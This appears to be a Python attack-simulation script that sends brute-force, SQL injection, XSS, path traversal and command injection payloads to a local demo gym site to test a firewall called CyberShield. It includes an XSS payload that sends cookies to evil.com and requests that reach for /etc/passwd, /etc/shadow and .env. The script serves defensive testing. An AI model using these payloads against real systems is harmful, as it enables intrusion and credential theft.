"""
FitZone Gym — CyberShield Attack Simulator
============================================
Sends real attacks directly to the gym website (http://localhost:4000).
CyberShield intercepts every request, analyses it, and blocks threats.

Usage:
    python gym_attacker.py --key cs_live_YOUR_API_KEY [--mode all] [--count 30]

Modes:
    all           - Run every attack type in sequence (default)
    brute_force   - Hammer /auth/login with wrong passwords (same IP → blocked)
    sqli          - SQL injection via login, search, contact forms
    xss           - XSS attacks via contact/comment fields
    path_traversal- Directory traversal via file params
    cmd_injection - Command injection via form fields
    normal        - Legitimate user traffic (shows as green in dashboard)
    mixed         - Random mix of 40% attacks + 60% normal traffic
"""

import argparse
import random
import sys
import time

try:
    import requests
except ImportError:
    print("[!] 'requests' not installed. Run:  pip install requests")
    sys.exit(1)

# ── Terminal colours ──────────────────────────────────────────────────────────
def red(s):    return f"\033[91m{s}\033[0m"
def green(s):  return f"\033[92m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def cyan(s):   return f"\033[96m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

GYM_URL       = "http://localhost:4000"
SHIELD_URL    = "http://localhost:5000"

# ── Real gym website attack payloads ─────────────────────────────────────────

BRUTE_FORCE = [
    ("alice@example.com", "wrongpass"),
    ("admin@fitzone.com", "admin"),
    ("alice@example.com", "123456"),
    ("admin@fitzone.com", "password"),
    ("alice@example.com", "letmein"),
    ("bob@example.com",   "qwerty"),
    ("admin@fitzone.com", "fitzone123"),
    ("alice@example.com", "abc123"),
    ("root@fitzone.com",  "root"),
    ("alice@example.com", "password1"),
    ("admin@fitzone.com", "1234"),
    ("alice@example.com", "pass"),
]

SQLI_LOGIN = [
    {"email": "' OR 1=1 --",           "password": "x"},
    {"email": "' OR '1'='1",            "password": "anything"},
    {"email": "admin'--",               "password": "x"},
    {"email": "' UNION SELECT * FROM users--", "password": "x"},
    {"email": "'; DROP TABLE users;--", "password": "x"},
]

SQLI_PATHS = [
    "/membership?plan=1' OR '1'='1",
    "/trainers?id=1 UNION SELECT username,password,3 FROM users--",
    "/auth/login?next=1'; SELECT * FROM users--",
    "/contact?name=' OR 1=1--",
]

XSS_CONTACT = [
    {"name": "<script>alert('XSS')</script>", "email": "x@x.com", "message": "test", "subject": "test"},
    {"name": "John", "email": "x@x.com", "message": "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>", "subject": "test"},
    {"name": "John", "email": "x@x.com", "message": "test", "subject": "javascript:alert(document.domain)"},
    {"name": "<svg onload=alert(1)>", "email": "x@x.com", "message": "normal msg", "subject": "help"},
    {"name": "test", "email": "x@x.com<script>", "message": "XSS via email", "subject": "test"},
]

PATH_TRAVERSAL_PATHS = [
    "/../../etc/passwd",
    "/static/../../../etc/shadow",
    "/membership?file=../../../../etc/hosts",
    "/trainers?img=../../../../../../etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/.env",
    "/.git/config",
    "/config.js",
]

CMD_INJECTION_CONTACT = [
    {"name": "John; cat /etc/passwd", "email": "x@x.com", "message": "test", "subject": "test"},
    {"name": "John", "email": "x@x.com", "message": "test && whoami", "subject": "test"},
    {"name": "John | ls -la", "email": "x@x.com", "message": "normal", "subject": "hack"},
    {"name": "$(id)", "email": "x@x.com", "message": "cmd inject", "subject": "test"},
    {"name": "`id`", "email": "x@x.com", "message": "backtick injection", "subject": "t"},
]

NORMAL_TRAFFIC = [
    ("GET",  "/",                None),
    ("GET",  "/about",           None),
    ("GET",  "/membership",      None),
    ("GET",  "/trainers",        None),
    ("GET",  "/contact",         None),
    ("GET",  "/auth/login",      None),
    ("POST", "/auth/login",      {"email": "alice@example.com", "password": "password123"}),
    ("GET",  "/membership",      None),
    ("GET",  "/trainers",        None),
    ("GET",  "/about",           None),
]

NORMAL_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148",
]

ATTACK_UA = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Acunetix Web Vulnerability Scanner/14",
    "python-requests/2.28.1",
    "curl/7.68.0",
]

# ── Core HTTP sender ──────────────────────────────────────────────────────────

session = requests.Session()

def send(method, path, data=None, params=None, ua=None, ip_hint=""):
    url = f"{GYM_URL}{path}"
    headers = {"User-Agent": ua or random.choice(ATTACK_UA)}
    try:
        if method == "POST":
            resp = session.post(url, data=data, headers=headers, timeout=4, allow_redirects=False)
        else:
            resp = session.get(url, params=params, headers=headers, timeout=4, allow_redirects=False)

        code = resp.status_code
        if code == 403:
            print(f"  {red('🚫 BLOCKED (403)')}  {method} {path[:50]}  {yellow('← CyberShield blocked this!')}")
        elif code in (200, 302):
            print(f"  {green('✅ REACHED  (' + str(code) + ')')}  {method} {path[:50]}")
        else:
            print(f"  {yellow('⚠️  CODE ' + str(code) + '     ')}  {method} {path[:50]}")
        return code
    except requests.exceptions.ConnectionError:
        print(red(f"  [ERROR] Cannot connect to gym website at {GYM_URL}. Is it running?"))
        return None

# ── Check CyberShield reachability ───────────────────────────────────────────

def check_shield(api_key):
    try:
        r = requests.get(f"{SHIELD_URL}/api/health", timeout=3)
        data = r.json()
        ml = data.get("model_loaded", False)
        print(green(f"  ✅ CyberShield backend reachable — ML model: {'loaded' if ml else 'NOT loaded'}"))
    except Exception:
        print(red(f"  ❌ CyberShield backend NOT reachable at {SHIELD_URL}"))
        print(red("     Make sure the backend is running: python app.py"))

# ── Attack scenarios ──────────────────────────────────────────────────────────

def run_brute_force(count, delay):
    print(bold(yellow(f"\n[ BRUTE FORCE ATTACK — /auth/login — same IP hammering ]")))
    print(f"  {cyan('Expected:')} After ~5 requests from same IP → 403 BLOCKED\n")
    for i in range(min(count, len(BRUTE_FORCE) * 3)):
        email, pwd = BRUTE_FORCE[i % len(BRUTE_FORCE)]
        send("POST", "/auth/login", {"email": email, "password": pwd},
             ua="python-requests/2.28.1")
        time.sleep(delay)

def run_sqli(count, delay):
    print(bold(yellow(f"\n[ SQL INJECTION ATTACK — login form + URL params ]")))
    print(f"  {cyan('Expected:')} Immediately blocked on first attempt (score ~95)\n")
    for i in range(count):
        if i % 2 == 0:
            p = SQLI_LOGIN[i % len(SQLI_LOGIN)]
            send("POST", "/auth/login", p, ua=random.choice(ATTACK_UA))
        else:
            path = SQLI_PATHS[i % len(SQLI_PATHS)]
            send("GET", path, ua=random.choice(ATTACK_UA))
        time.sleep(delay)

def run_xss(count, delay):
    print(bold(yellow(f"\n[ XSS ATTACK — /contact form ]")))
    print(f"  {cyan('Expected:')} Blocked (score ~75–90)\n")
    for i in range(count):
        p = XSS_CONTACT[i % len(XSS_CONTACT)]
        send("POST", "/contact", p, ua=random.choice(ATTACK_UA))
        time.sleep(delay)

def run_path_traversal(count, delay):
    print(bold(yellow(f"\n[ PATH TRAVERSAL — directory escape attempts ]")))
    print(f"  {cyan('Expected:')} Blocked immediately (score ~80–95)\n")
    for i in range(count):
        path = PATH_TRAVERSAL_PATHS[i % len(PATH_TRAVERSAL_PATHS)]
        send("GET", path, ua=random.choice(ATTACK_UA))
        time.sleep(delay)

def run_cmd_injection(count, delay):
    print(bold(yellow(f"\n[ COMMAND INJECTION — /contact form ]")))
    print(f"  {cyan('Expected:')} Blocked immediately (score ~90+)\n")
    for i in range(count):
        p = CMD_INJECTION_CONTACT[i % len(CMD_INJECTION_CONTACT)]
        send("POST", "/contact", p, ua=random.choice(ATTACK_UA))
        time.sleep(delay)

def run_normal(count, delay):
    print(bold(green(f"\n[ NORMAL TRAFFIC — legitimate gym visitors ]")))
    print(f"  {cyan('Expected:')} All requests allowed (200/302)\n")
    for i in range(count):
        method, path, data = NORMAL_TRAFFIC[i % len(NORMAL_TRAFFIC)]
        send(method, path, data, ua=random.choice(NORMAL_UA))
        time.sleep(delay)

def run_mixed(count, delay):
    print(bold(cyan(f"\n[ MIXED TRAFFIC — 40% attacks + 60% normal — best for dashboard demo ]")))
    print(f"  {cyan('Watch the CyberShield dashboard at http://localhost:3000')}\n")
    attack_actions = [
        lambda: send("POST", "/auth/login", random.choice(SQLI_LOGIN), ua=random.choice(ATTACK_UA)),
        lambda: send("GET", random.choice(SQLI_PATHS), ua=random.choice(ATTACK_UA)),
        lambda: send("POST", "/contact", random.choice(XSS_CONTACT), ua=random.choice(ATTACK_UA)),
        lambda: send("GET", random.choice(PATH_TRAVERSAL_PATHS), ua=random.choice(ATTACK_UA)),
        lambda: send("POST", "/contact", random.choice(CMD_INJECTION_CONTACT), ua=random.choice(ATTACK_UA)),
        lambda: send("POST", "/auth/login",
                     {"email": random.choice(BRUTE_FORCE)[0], "password": "wrongpass"},
                     ua="sqlmap/1.7.8"),
    ]
    normal_actions = [
        lambda: send("GET", m, ua=random.choice(NORMAL_UA))
        for _, m, _ in NORMAL_TRAFFIC if _ == "GET"
    ]
    for _ in range(count):
        if random.random() < 0.4:
            random.choice(attack_actions)()
        else:
            random.choice(normal_actions)()
        time.sleep(delay)

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="FitZone Gym — CyberShield Attack Simulator")
    parser.add_argument("--key",      required=True, help="CyberShield API key (cs_live_...)")
    parser.add_argument("--mode",     default="all",
                        choices=["all","mixed","brute_force","sqli","xss",
                                 "path_traversal","cmd_injection","normal"])
    parser.add_argument("--count",    type=int,   default=30, help="Requests per attack type")
    parser.add_argument("--delay",    type=float, default=0.4, help="Delay between requests (s)")
    args = parser.parse_args()

    print(bold(cyan("\n╔═══════════════════════════════════════════════════════════╗")))
    print(bold(cyan("║     FitZone Gym × CyberShield — Attack Simulator         ║")))
    print(bold(cyan("╚═══════════════════════════════════════════════════════════╝")))
    print(f"\n  Gym website  : {GYM_URL}")
    print(f"  CyberShield  : {SHIELD_URL}")
    print(f"  Dashboard    : http://localhost:3000")
    print(f"  Mode         : {bold(args.mode)}")
    print(f"  Count        : {args.count} requests per type")
    print(f"\n  {bold(yellow('Open the CyberShield dashboard NOW to watch attacks in real-time!'))}\n")
    print("─" * 65)

    print(bold("\n[ Checking connectivity... ]"))
    check_shield(args.key)
    try:
        r = requests.get(GYM_URL, timeout=3)
        print(green(f"  ✅ FitZone Gym reachable at {GYM_URL} (HTTP {r.status_code})"))
    except Exception:
        print(red(f"  ❌ FitZone Gym NOT reachable. Run: npm start  (in testing_website folder)"))
        sys.exit(1)

    d = args.delay
    c = args.count

    if args.mode == "brute_force":   run_brute_force(c, d)
    elif args.mode == "sqli":        run_sqli(c, d)
    elif args.mode == "xss":         run_xss(c, d)
    elif args.mode == "path_traversal": run_path_traversal(c, d)
    elif args.mode == "cmd_injection":  run_cmd_injection(c, d)
    elif args.mode == "normal":      run_normal(c, d)
    elif args.mode == "mixed":       run_mixed(c, d)
    elif args.mode == "all":
        per = max(5, c // 6)
        run_normal(per, d)
        run_brute_force(per, d)
        run_sqli(per, d)
        run_xss(per, d)
        run_path_traversal(per, d)
        run_cmd_injection(per, d)

    print("\n" + "─" * 65)
    print(bold(green("\n✅ Attack simulation complete!")))
    print(f"   Check the CyberShield dashboard → {bold('http://localhost:3000')}")
    print(f"   • Blocked IPs page: see which attacker IPs got banned")
    print(f"   • Attacks page: full history with risk scores")
    print(f"   • Dashboard: live chart showed spikes during the attack\n")

if __name__ == "__main__":
    main()
